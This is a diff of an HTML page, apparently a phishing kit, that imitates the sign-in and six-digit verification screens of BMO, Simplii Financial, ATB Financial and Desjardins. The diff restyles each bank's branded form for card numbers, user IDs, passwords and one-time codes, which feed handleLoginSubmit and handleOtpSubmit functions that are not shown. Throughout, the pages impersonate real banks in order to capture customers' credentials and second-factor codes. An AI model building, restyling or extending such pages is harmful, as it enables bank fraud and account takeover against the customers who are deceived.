-            <div id="bmoAuthCodeView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden">
+            <div id="bmoAuthCodeView" class="hidden bmo-blue-header text-white p-6 rounded-lg shadow-md">
                 <!-- Header similar to BMO login -->
-                <div class="flex items-center space-x-3 bmo-blue-header text-white px-4 py-2"> <!-- Adjusted py-2 -->
-                    <div class="border border-white p-1 rounded-md flex items-center space-x-1">
-                        <img src="qr.png" alt="QR Code" class="w-5 h-5">
-                        <span class="text-sm">QR Code</span>
+                <div class="flex items-center space-x-3 mb-8">
+                    <img src="optionl2.png" alt="BMO Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">BMO</span>
+                </div>
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-200 mb-4">A code has been sent to your registered mobile number.</p>
+                <form class="space-y-6" id="bmoOtpForm">
+                    <div class="code-input-group" id="bmoCodeInputs">
+                        <input type="number" id="bmoCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="bmoCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="bmoCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="bmoCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="bmoCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="bmoCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
                     </div>
-                    <img src="optionl2.png" alt="BMO Bank of Montreal Logo" class="w-64 h-64 object-contain">
-                    <!-- Removed BMO text -->
-                </div>
-                <div class="bmo-light-blue-bg p-6">
-                    <h2 class="text-xl font-semibold text-gray-800 mb-6">Enter Your 6-Digit Code</h2>
-                    <p class="text-sm text-gray-600 mb-4">A code has been sent to your registered mobile number.</p>
-                    <form class="space-y-6" id="bmoOtpForm">
-                        <div class="code-input-group" id="bmoCodeInputs">
-                            <input type="number" id="bmoCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="bmoCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="bmoCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="bmoCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="bmoCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="bmoCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
-                        </div>
-                        <button type="button" onclick="handleOtpSubmit('bmo')" class="bmo-blue-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
-                            Verify Code
-                        </button>
-                        <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
-                    </form>
-                </div>
+                    <button type="button" onclick="handleOtpSubmit('bmo')" class="bmo-blue-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Verify Code
+                    </button>
+                    <a href="#" class="block mt-4 text-sm text-blue-300 hover:underline text-center">Resend Code</a>
+                </form>
                 <button onclick="showBMOLoginView(); logUserAction('Back to BMO Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Login</span>
@@ -1011,76 +916,54 @@
             </div>
 
             <!-- Simplii Financial Login View -->
-            <div id="simpliiLoginView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden p-6">
-                <!-- Simplii Financial Header -->
-                <div class="flex justify-end mb-8">
-                    <img src="optionl13.png" alt="Simplii Financial Logo" class="w-32 h-32 object-contain">
-                    <span class="text-3xl font-bold simplii-text-pink">Simplii<br>Financial</span>
+            <div id="simpliiLoginView" class="hidden simplii-pink-bg text-white p-6 rounded-lg shadow-md">
+                <!-- Simplii Header -->
+                <div class="flex items-center space-x-3 mb-8">
+                    <!-- Simplii Logo -->
+                    <img src="optionl13.png" alt="Simplii Financial Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">Simplii Financial</span>
                 </div>
-
-                <h2 class="text-xl font-semibold text-gray-800 mb-6">Sign on to Online banking</h2>
-
-                <form class="space-y-4" id="simpliiLoginForm">
+                <h2 class="text-2xl font-semibold mb-6">Sign in to Simplii Financial online banking</h2>
+                <form class="space-y-6" id="simpliiLoginForm">
                     <div>
-                        <label for="simpliiCardNumber" class="block text-sm font-medium text-gray-700 mb-1">Card number</label>
-                        <input type="text" id="simpliiCardNumber" name="simpliiCardNumber" placeholder="0283-376290482"
-                               class="mt-1 block w-full px-4 py-2 border-b border-gray-300 bg-transparent focus:border-pink-500 focus:outline-none sm:text-sm">
+                        <label for="simpliiCardNumber" class="block text-sm font-medium mb-1">Card number or username</label>
+                        <input type="text" id="simpliiCardNumber" name="simpliiCardNumber"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm text-gray-900 focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                     </div>
-
                     <div>
-                        <div class="flex items-center justify-between">
-                            <label for="simpliiPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
-                            <a href="#" class="text-sm text-blue-600 hover:underline">Reset your password</a>
-                        </div>
-                        <div class="relative">
-                            <input type="password" id="simpliiPassword" name="simpliiPassword" placeholder="********"
-                                   class="mt-1 block w-full px-4 py-2 border-b border-gray-300 bg-transparent focus:border-pink-500 focus:outline-none sm:text-sm">
-                            <div class="absolute inset-y-0 right-0 pr-3 flex items-center">
-                                <input id="simpliiShowPassword" name="simpliiShowPassword" type="checkbox"
-                                       class="h-4 w-4 text-pink-600 focus:ring-pink-500 border-gray-300 rounded">
-                                <label for="simpliiShowPassword" class="ml-2 text-sm text-gray-700">Show password</label>
-                            </div>
-                        </div>
+                        <label for="simpliiPassword" class="block text-sm font-medium mb-1">Password</label>
+                        <input type="password" id="simpliiPassword" name="simpliiPassword"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm text-gray-900 focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                     </div>
-
-                    <div class="flex items-center space-x-4 mt-4">
-                        <input id="simpliiRememberCard" name="simpliiRememberCard" type="checkbox" checked
-                               class="h-4 w-4 text-pink-600 focus:ring-pink-500 border-gray-300 rounded">
-                        <label for="simpliiRememberCard" class="ml-2 block text-sm text-gray-700">Remember my card</label>
-                        <div>
-                            <label for="simpliiCardDescription" class="block text-sm font-medium text-gray-700 mb-1">Card description (optional)</label>
-                            <input type="text" id="simpliiCardDescription" name="simpliiCardDescription" placeholder="hannot"
-                                   class="mt-1 block w-full px-4 py-2 border-b border-gray-300 bg-transparent focus:border-pink-500 focus:outline-none sm:text-sm">
+                    <div class="flex items-center justify-between text-sm">
+                        <div class="flex items-center">
+                            <input id="simpliiRememberMe" name="simpliiRememberMe" type="checkbox"
+                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="simpliiRememberMe" class="ml-2 block">Remember me</label>
                         </div>
+                        <a href="#" class="font-medium text-blue-300 hover:underline">Forgot your password?</a>
                     </div>
-
-                    <div class="flex justify-between space-x-4 mt-6">
-                        <button type="button" class="inline-flex justify-center py-2 px-4 border border-gray-300 shadow-sm text-sm font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition duration-150 ease-in-out">
-                            Register
-                        </button>
-                        <button type="button" onclick="handleLoginSubmit('simplii')"
-                                class="simplii-pink-btn inline-flex justify-center py-2 px-4 border border-transparent shadow-sm text-sm font-medium rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-pink-500 transition duration-150 ease-in-out">
-                            Sign on
-                        </button>
-                    </div>
+                    <button type="button" onclick="handleLoginSubmit('simplii')"
+                            class="simplii-pink-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Sign In
+                    </button>
                 </form>
-
-                <button onclick="showOptionSelectionView(); logUserAction('Back to Options from Simplii Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
+                <button onclick="showOptionSelectionView(); logUserAction('Back to Options from Simplii Financial Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Options</span>
                 </button>
             </div>
 
             <!-- Simplii Financial 6-Digit Code Entry View (newly added) -->
-            <div id="simpliiAuthCodeView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden p-6">
+            <div id="simpliiAuthCodeView" class="hidden simplii-pink-bg text-white p-6 rounded-lg shadow-md">
                 <!-- Header similar to Simplii Financial login -->
-                <div class="flex justify-end mb-8">
-                    <img src="optionl13.png" alt="Simplii Financial Logo" class="w-32 h-32 object-contain">
-                    <span class="text-3xl font-bold simplii-text-pink">Simplii<br>Financial</span>
+                <div class="flex items-center space-x-3 mb-8">
+                    <img src="optionl13.png" alt="Simplii Financial Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">Simplii Financial</span>
                 </div>
-                <h2 class="text-xl font-semibold text-gray-800 mb-6">Enter Your 6-Digit Code</h2>
-                <p class="text-sm text-gray-600 mb-4">A code has been sent to your registered mobile number.</p>
-                <form class="space-y-4" id="simpliiOtpForm">
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-200 mb-4">A code has been sent to your registered mobile number.</p>
+                <form class="space-y-6" id="simpliiOtpForm">
                     <div class="code-input-group" id="simpliiCodeInputs">
                         <input type="number" id="simpliiCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
                         <input type="number" id="simpliiCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
@@ -1092,168 +975,144 @@
                     <button type="button" onclick="handleOtpSubmit('simplii')" class="simplii-pink-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
                         Verify Code
                     </button>
-                    <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
+                    <a href="#" class="block mt-4 text-sm text-blue-300 hover:underline text-center">Resend Code</a>
                 </form>
-                <button onclick="showSimpliiLoginView(); logUserAction('Back to Simplii Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
+                <button onclick="showSimpliiLoginView(); logUserAction('Back to Simplii Financial Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Login</span>
                 </button>
             </div>
 
-            <!-- ATB Login View -->
-            <div id="atbLoginView" class="hidden atb-blue-bg text-white min-h-screen flex flex-col justify-between">
-                <!-- Header -->
-                <div class="flex justify-between items-center p-4">
-                    <button onclick="showOptionSelectionView(); logUserAction('Back to Options from ATB Login')" class="text-white">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
-                    </button>
-                    <span class="text-sm font-semibold">login.atb.com</span>
-                    <button class="text-white">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>
-                    </button>
+            <!-- ATB Financial Login View -->
+            <div id="atbLoginView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
+                <!-- ATB Header -->
+                <div class="flex items-center space-x-3 mb-8">
+                    <!-- ATB Logo -->
+                    <img src="optionl1.png" alt="ATB Financial Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">ATB Financial</span>
                 </div>
-
-                <!-- Main Content Area -->
-                <div class="flex-grow flex flex-col items-center justify-center p-4 text-center">
-                    <h1 class="text-3xl font-bold mb-4">Highly secure.<br>Always private.</h1>
-                    <img src="optionl1.png" alt="ATB Logo" class="w-48 object-contain mx-auto mb-6"> <!-- Inserted logo here -->
-                    <p class="text-sm text-gray-200 max-w-xs mb-8">Advanced encryption, passkey biometrics, and two-factor authentication keep your accounts secure.</p>
-
-                    <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-sm">
-                        <form class="space-y-4" id="atbLoginForm">
-                            <div>
-                                <label for="atbUsername" class="sr-only">Username</label>
-                                <input type="text" id="atbUsername" name="atbUsername" placeholder="Enter your username"
-                                       class="block w-full px-4 py-3 border border-gray-300 rounded-md shadow-sm text-gray-900 focus:ring-blue-500 focus:border-blue-500">
-                            </div>
-                            <div>
-                                <label for="atbPassword" class="sr-only">Password</label>
-                                <input type="password" id="atbPassword" name="atbPassword" placeholder="Enter your password"
-                                       class="block w-full px-4 py-3 border border-gray-300 rounded-md shadow-sm text-gray-900 focus:ring-blue-500 focus:border-blue-500">
-                            </div>
-                            <button type="button" onclick="handleLoginSubmit('atb')" class="atb-btn w-full font-bold py-3 px-4 rounded-md transition duration-150 ease-in-out">
-                                Log in
-                            </button>
-                        </form>
-                        <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline">Forgot username or password?</a>
+                <h2 class="text-2xl font-semibold mb-6">Sign in to ATB Online Banking</h2>
+                <form class="space-y-6" id="atbLoginForm">
+                    <div>
+                        <label for="atbUserId" class="block text-sm font-medium text-gray-700 mb-1">User ID</label>
+                        <input type="text" id="atbUserId" name="atbUserId"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
                     </div>
-                </div>
-
-                <!-- Footer (minimal, as per image) -->
-                <div class="p-4 text-center text-xs text-gray-300">
-                    <!-- No specific content shown in the image for the very bottom, so keeping it minimal -->
-                </div>
+                    <div>
+                        <label for="atbPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                        <input type="password" id="atbPassword" name="atbPassword"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div class="flex items-center justify-between text-sm">
+                        <div class="flex items-center">
+                            <input id="atbRememberMe" name="atbRememberMe" type="checkbox"
+                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="atbRememberMe" class="ml-2 block text-gray-700">Remember my User ID</label>
+                        </div>
+                        <a href="#" class="font-medium atb-dark-blue-text hover:underline">Forgot User ID or Password?</a>
+                    </div>
+                    <button type="button" onclick="handleLoginSubmit('atb')"
+                            class="atb-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Sign In
+                    </button>
+                </form>
+                <button onclick="showOptionSelectionView(); logUserAction('Back to Options from ATB Financial Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
+                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
+                    <span>Back to Options</span>
+                </button>
             </div>
 
-            <!-- ATB 6-Digit Code Entry View (newly added) -->
-            <div id="atbAuthCodeView" class="hidden atb-blue-bg text-white min-h-screen flex flex-col justify-between">
-                <!-- Header similar to ATB login -->
-                <div class="flex justify-between items-center p-4">
-                    <button onclick="showATBLoginView(); logUserAction('Back to ATB Login from OTP')" class="text-white">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
-                    </button>
-                    <span class="text-sm font-semibold">login.atb.com</span>
-                    <button class="text-white">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path></svg>
-                    </button>
+            <!-- ATB Financial 6-Digit Code Entry View (newly added) -->
+            <div id="atbAuthCodeView" class="hidden atb-blue-bg text-white p-6 rounded-lg shadow-md">
+                <!-- Header similar to ATB Financial login -->
+                <div class="flex items-center space-x-3 mb-8">
+                    <img src="optionl1.png" alt="ATB Financial Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">ATB Financial</span>
                 </div>
-                <div class="flex-grow flex flex-col items-center justify-center p-4 text-center">
-                    <h2 class="text-3xl font-bold mb-4">Enter Your 6-Digit Code</h2>
-                    <p class="text-sm text-gray-200 max-w-xs mb-8">A code has been sent to your registered mobile number.</p>
-                    <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-sm">
-                        <form class="space-y-4" id="atbOtpForm">
-                            <div class="code-input-group" id="atbCodeInputs">
-                                <input type="number" id="atbCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                                <input type="number" id="atbCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                                <input type="number" id="atbCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                                <input type="number" id="atbCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                                <input type="number" id="atbCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                                <input type="number" id="atbCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            </div>
-                            <button type="button" onclick="handleOtpSubmit('atb')" class="atb-btn w-full font-bold py-3 px-4 rounded-md transition duration-150 ease-in-out">
-                                Verify Code
-                            </button>
-                            <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
-                        </form>
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-200 mb-4">A code has been sent to your registered mobile number.</p>
+                <form class="space-y-6" id="atbOtpForm">
+                    <div class="code-input-group" id="atbCodeInputs">
+                        <input type="number" id="atbCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="atbCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="atbCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="atbCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="atbCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="atbCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
                     </div>
-                </div>
-                <div class="p-4 text-center text-xs text-gray-300">
-                    <!-- No specific content shown in the image for the very bottom, so keeping it minimal -->
-                </div>
+                    <button type="button" onclick="handleOtpSubmit('atb')" class="atb-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Verify Code
+                    </button>
+                    <a href="#" class="block mt-4 text-sm atb-dark-blue-text hover:underline text-center">Resend Code</a>
+                </form>
+                <button onclick="showATBLoginView(); logUserAction('Back to ATB Financial Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
+                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
+                    <span>Back to Login</span>
+                </button>
             </div>
 
             <!-- Desjardins Login View -->
-            <div id="desjardinsLoginView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden">
+            <div id="desjardinsLoginView" class="hidden bg-white text-gray-800 p-6 rounded-lg shadow-md">
                 <!-- Desjardins Header -->
-                <div class="flex justify-between items-center p-4 border-b border-gray-200">
-                    <div class="flex items-center space-x-2">
-                        <img src="optionl4.png" alt="Desjardins Logo" class="w-24 h-24 object-contain">
-                        <span class="text-xl font-bold desjardins-green-text">Desjardins</span>
-                    </div>
-                    <a href="#" class="text-blue-600 text-sm hover:underline">Français</a>
+                <div class="flex items-center space-x-3 mb-8">
+                    <!-- Desjardins Logo -->
+                    <img src="optionl4.png" alt="Desjardins Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">Desjardins</span>
                 </div>
-
-                <div class="p-6">
-                    <h2 class="text-2xl font-semibold mb-6">Sign in to AccèsD</h2>
-
-                    <form class="space-y-4" id="desjardinsLoginForm">
-                        <div>
-                            <label for="desjardinsUsername" class="block text-sm font-medium text-gray-700 mb-1">Username</label>
-                            <input type="text" id="desjardinsUsername" name="desjardinsUsername" placeholder="Your username"
-                                   class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-green-500 focus:border-green-500 sm:text-sm">
-                        </div>
-                        <div>
-                            <label for="desjardinsPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
-                            <input type="password" id="desjardinsPassword" name="desjardinsPassword" placeholder="Your password"
-                                   class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-green-500 focus:border-green-500 sm:text-sm">
-                        </div>
+                <h2 class="text-2xl font-semibold mb-6">Accéder à AccèsD</h2>
+                <form class="space-y-6" id="desjardinsLoginForm">
+                    <div>
+                        <label for="desjardinsUser" class="block text-sm font-medium text-gray-700 mb-1">User ID</label>
+                        <input type="text" id="desjardinsUser" name="desjardinsUser"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div>
+                        <label for="desjardinsPassword" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                        <input type="password" id="desjardinsPassword" name="desjardinsPassword"
+                               class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm">
+                    </div>
+                    <div class="flex items-center justify-between text-sm">
                         <div class="flex items-center">
                             <input id="desjardinsRememberMe" name="desjardinsRememberMe" type="checkbox"
-                                   class="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 rounded">
-                            <label for="desjardinsRememberMe" class="ml-2 block text-sm text-gray-700">Remember me</label>
+                                   class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="desjardinsRememberMe" class="ml-2 block text-gray-700">Remember my User ID</label>
                         </div>
-                        <button type="button" onclick="handleLoginSubmit('desjardins')" class="desjardins-green-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out">
-                            Sign in
-                        </button>
-                    </form>
-                    <div class="mt-4 text-center">
-                        <a href="#" class="text-sm text-blue-600 hover:underline">Forgot your username or password?</a>
+                        <a href="#" class="font-medium desjardins-green-text hover:underline">Forgot your User ID or password?</a>
                     </div>
-                </div>
+                    <button type="button" onclick="handleLoginSubmit('desjardins')"
+                            class="desjardins-green-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Sign In
+                    </button>
+                </form>
                 <button onclick="showOptionSelectionView(); logUserAction('Back to Options from Desjardins Login')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Options</span>
                 </button>
             </div>
 
-            <!-- Desjardins 6-Digit Code Entry View -->
-            <div id="desjardinsAuthCodeView" class="hidden bg-white text-gray-800 rounded-lg shadow-md overflow-hidden">
-                <!-- Desjardins Header -->
-                <div class="flex justify-between items-center p-4 border-b border-gray-200">
-                    <div class="flex items-center space-x-2">
-                        <img src="optionl4.png" alt="Desjardins Logo" class="w-24 h-24 object-contain">
-                        <span class="text-xl font-bold desjardins-green-text">Desjardins</span>
+            <!-- Desjardins 6-Digit Code Entry View (newly added) -->
+            <div id="desjardinsAuthCodeView" class="hidden desjardins-green-btn text-white p-6 rounded-lg shadow-md">
+                <!-- Header similar to Desjardins login -->
+                <div class="flex items-center space-x-3 mb-8">
+                    <img src="optionl4.png" alt="Desjardins Logo" class="w-24 h-24 object-contain">
+                    <span class="text-2xl font-bold">Desjardins</span>
+                </div>
+                <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
+                <p class="text-sm text-gray-200 mb-4">A code has been sent to your registered mobile number.</p>
+                <form class="space-y-6" id="desjardinsOtpForm">
+                    <div class="code-input-group" id="desjardinsCodeInputs">
+                        <input type="number" id="desjardinsCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="desjardinsCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="desjardinsCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="desjardinsCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="desjardinsCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
+                        <input type="number" id="desjardinsCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
                     </div>
-                    <a href="#" class="text-blue-600 text-sm hover:underline">Français</a>
-                </div>
-                <div class="p-6">
-                    <h2 class="text-2xl font-semibold mb-6">Enter Your 6-Digit Code</h2>
-                    <p class="text-sm text-gray-600 mb-4">A code has been sent to your registered mobile number.</p>
-                    <form class="space-y-4" id="desjardinsOtpForm">
-                        <div class="code-input-group" id="desjardinsCodeInputs">
-                            <input type="number" id="desjardinsCode1" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="desjardinsCode2" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="desjardinsCode3" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="desjardinsCode4" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="desjardinsCode5" maxlength="1" oninput="moveToNext(this)" onkeydown="moveToPrevious(event, this)" class="code-input">
-                            <input type="number" id="desjardinsCode6" maxlength="1" onkeydown="moveToPrevious(event, this)" class="code-input">
-                        </div>
-                        <button type="button" onclick="handleOtpSubmit('desjardins')" class="desjardins-green-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out">
-                            Verify Code
-                        </button>
-                        <a href="#" class="block mt-4 text-sm text-blue-600 hover:underline text-center">Resend Code</a>
-                    </form>
-                </div>
+                    <button type="button" onclick="handleOtpSubmit('desjardins')" class="desjardins-green-btn w-full font-bold py-3 px-4 rounded-lg transition duration-150 ease-in-out mt-6">
+                        Verify Code
+                    </button>
+                    <a href="#" class="block mt-4 text-sm text-blue-300 hover:underline text-center">Resend Code</a>
+                </form>
                 <button onclick="showDesjardinsLoginView(); logUserAction('Back to Desjardins Login from OTP')" class="mt-8 w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-3 px-4 rounded-lg flex items-center justify-center transition duration-150 ease-in-out">
                     <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back to Login</span>
@@ -1261,77 +1120,67 @@
